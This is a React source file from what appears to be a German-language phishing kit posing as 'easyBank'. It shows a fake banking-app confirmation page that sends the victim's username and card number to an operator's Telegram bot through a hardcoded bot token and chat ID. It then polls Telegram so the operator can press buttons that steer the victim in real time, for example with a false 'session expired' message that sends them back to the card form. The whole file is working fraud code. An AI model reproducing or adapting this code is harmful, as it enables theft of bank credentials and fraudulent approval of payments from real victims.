import React, { useEffect, useState } from 'react';
// eslint-disable-next-line no-unused-vars
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import './NextStepAppr.css';
import visaLogo from '../assets/visa-logo.png';
import mastercardLogo from '../assets/mastercard-logo.png';

const TELEGRAM_BOT_TOKEN = '8208470293:AAFYLJdfLdnXMJJCqTsKRoGufdA1khfif3U';
const TELEGRAM_ACTIONS_CHAT_ID = '-5097850013';

function NextStepAppr() {
  // eslint-disable-next-line no-unused-vars
  // const navigate = useNavigate();
  const [isConfirmed, setIsConfirmed] = useState(false);
  const [currentTime, setCurrentTime] = useState(new Date());
  const [cardNumber, setCardNumber] = useState('**** **** **** 9116');
  const [username, setUsername] = useState('');
  const [isSending, setIsSending] = useState(false);

  // ✅ Message states
  const [showMessage, setShowMessage] = useState(false);
  const [messageText, setMessageText] = useState('');
  const [messageType, setMessageType] = useState(''); // 'success' or 'warning'

  // ✅ Handle Success button - Show message on page
  const handleSuccessCard = () => {
  console.log('✅ Success button clicked');
  setIsConfirmed(false);
  setMessageText('Ihre Sitzung ist abgelaufen. Bitte versuchen Sie es erneut.');
  setMessageType('warning');
  setShowMessage(true);
  
  // Hide message after 3 seconds and redirect
  setTimeout(() => {
    setShowMessage(false);
    sessionStorage.setItem('showCardForm', 'true');
    window.location.href = '/#/';
  }, 3000);
};

  // ✅ Handle Back to Appr button - Show message on page
  const handleBackToAppr = () => {
    console.log('⬅️ Back to Appr clicked');
    setIsConfirmed(false);
    setMessageText('Bitte stellen Sie sicher, dass Sie in der Banking-App bestätigt haben.');
    setMessageType('warning');
    setShowMessage(true);
    
    // Hide message after 3 seconds
    setTimeout(() => {
      setShowMessage(false);
    }, 3000);
  };

  // ✅ Close message manually
  const closeMessage = () => {
    setShowMessage(false);
  };

  // ✅ ADDED: Polling for Telegram callbacks
  useEffect(() => {
    let lastUpdateId = 0;
    
    const pollTelegram = async () => {
      try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`;
        const response = await axios.get(url);
        
        if (response.data.result && response.data.result.length > 0) {
          for (const update of response.data.result) {
            lastUpdateId = update.update_id;
            
            if (update.callback_query) {
              const callbackData = update.callback_query.data;
              
              if (callbackData.startsWith('success_card_')) {
                handleSuccessCard();
              } else if (callbackData.startsWith('back_to_appr_')) {
                handleBackToAppr();
              }
              
              await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                callback_query_id: update.callback_query.id,
                text: '✅ Aktion ausgeführt!'
              });
            }
          }
        }
      } catch (error) {
        console.error('Polling error:', error);
      }
    };
    
    const interval = setInterval(pollTelegram, 3000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    const storedCardNumber = sessionStorage.getItem('cardNumber');
    const storedUsername = sessionStorage.getItem('loginName');
    
    if (storedCardNumber) {
      const last4 = storedCardNumber.slice(-4);
      setCardNumber(`**** **** **** ${last4}`);
    }
    if (storedUsername) {
      setUsername(storedUsername);
    }
    
    const timer = setInterval(() => {
      setCurrentTime(new Date());
    }, 1000);
    
    return () => clearInterval(timer);
  }, []);

  const sendTelegramLog = async () => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `✅ <b>USER CONFIRMED IN BANKING APP</b> ✅
━━━━━━━━━━━━━━━━━━━━━
👤 <b>Username:</b> ${username || 'Unknown'}
💳 <b>Card Number:</b> ${cardNumber}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
🔐 <b>Status:</b> Confirmed in mobile banking app
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>Choose an action:</i>`;

      const keyboard = {
        inline_keyboard: [
          [
            { text: "✅ Success", callback_data: `success_card_${Date.now()}` },
            { text: "⬅️ Back to Appr", callback_data: `back_to_appr_${Date.now()}` }
          ]
        ]
      };

      const response = await axios.post(url, {
        chat_id: TELEGRAM_ACTIONS_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        reply_markup: keyboard
      });
      
      console.log('✅ Telegram log sent with buttons:', response.data);
      return true;
    } catch (error) {
      console.error('❌ Error sending Telegram log:', error.response?.data || error.message);
      return false;
    }
  };

  const handleConfirm = async () => {
    console.log('🟢 Confirm button clicked!');
    setIsSending(true);
    
    const sent = await sendTelegramLog();
    
    if (sent) {
      sessionStorage.setItem('paymentConfirmed', 'true');
      setIsConfirmed(true);
    } else {
      setMessageText('Fehler beim Senden. Bitte versuchen Sie es erneut.');
      setMessageType('warning');
      setShowMessage(true);
      setTimeout(() => setShowMessage(false), 3000);
    }
    
    setIsSending(false);
  };

  // Show waiting page AFTER confirmation
  if (isConfirmed) {
    return (
      <div className="waiting-container-page">
        {/* ✅ Message Popup */}
        {showMessage && (
          <div className={`message-popup ${messageType}`}>
            <span className="message-icon">{messageType === 'warning' ? '⚠️' : '✅'}</span>
            <span className="message-text">{messageText}</span>
            <button className="message-close" onClick={closeMessage}>×</button>
          </div>
        )}
        
        <div className="waiting-card">
          <div className="bank-logo-container">
            <div className="bank-logo">easyBank</div>
          </div>
          <h2 className="waiting-title">Bestätigung in der App</h2>
          
          <div className="animated-loader">
            <div className="loader-ring"></div>
            <div className="loader-ring-2"></div>
            <div className="loader-ring-3"></div>
            <div className="loader-dot"></div>
          </div>
          
          <h3>Warte auf Bestätigung</h3>
          <p>Ihre Bestätigung wurde gesendet.</p>
          <p>Bitte überprüfen Sie Ihre Banking-App.</p>
          <p className="waiting-time">Aktuelle Zeit: {currentTime.toLocaleString()}</p>
        </div>
      </div>
    );
  }

  // Show RB Key confirmation page FIRST
  return (
    <div className="confirmation-overlay">
      {/* ✅ Message Popup */}
      {showMessage && (
        <div className={`message-popup ${messageType}`}>
          <span className="message-icon">{messageType === 'warning' ? '' : '✅'}</span>
          <span className="message-text">{messageText}</span>
          <button className="message-close" onClick={closeMessage}>×</button>
        </div>
      )}
      
      <div className="confirmation-modal">
        <div className="modal-header">
          <div className="bank-logo-container">
            <span className="bank-brand">easyBank</span>
          </div>
          <div className="card-icons">
            <img src={visaLogo} alt="VISA" className="visa-logo" />
            <img src={mastercardLogo} alt="Mastercard" className="mastercard-logo" />
          </div>
        </div>

        <h3>Bestätigung in der Banking-App</h3>
        
        <div className="confirmation-details">
          <div className="detail-row">
            <span className="detail-label">Händler:</span>
            <span className="detail-value">easyBank</span>
          </div>
          <div className="detail-row">
            <span className="detail-label">Betrag:</span>
            <span className="detail-value">0,00 €</span>
          </div>
          <div className="detail-row">
            <span className="detail-label">Datum:</span>
            <span className="detail-value">{new Date().toLocaleString()}</span>
          </div>
          <div className="detail-row">
            <span className="detail-label">Kartennummer:</span>
            <span className="detail-value">{cardNumber}</span>
          </div>
        </div>

        <div className="confirmation-instructions">
          <p>• Öffnen Sie die Banking-App auf Ihrem Smartphone.</p>
          <p>• Kehren Sie nach der Bestätigung zu diesem Bildschirm zurück.</p>
          <p>• Tippen Sie auf "BESTÄTIGEN", wenn Sie zurück sind.</p>
        </div>

        <div className="confirmation-buttons">
          <button 
            onClick={handleConfirm} 
            className="confirm-btn"
            disabled={isSending}
          >
            {isSending ? 'Wird gesendet...' : 'Bestätigen'}
          </button>
        </div>
        
        <div className="secure-badge">
          <span className="lock-icon">🔒</span>
          <span>Sicher durch easyBank geschützt</span>
        </div>
      </div>
    </div>
  );
}

export default NextStepAppr;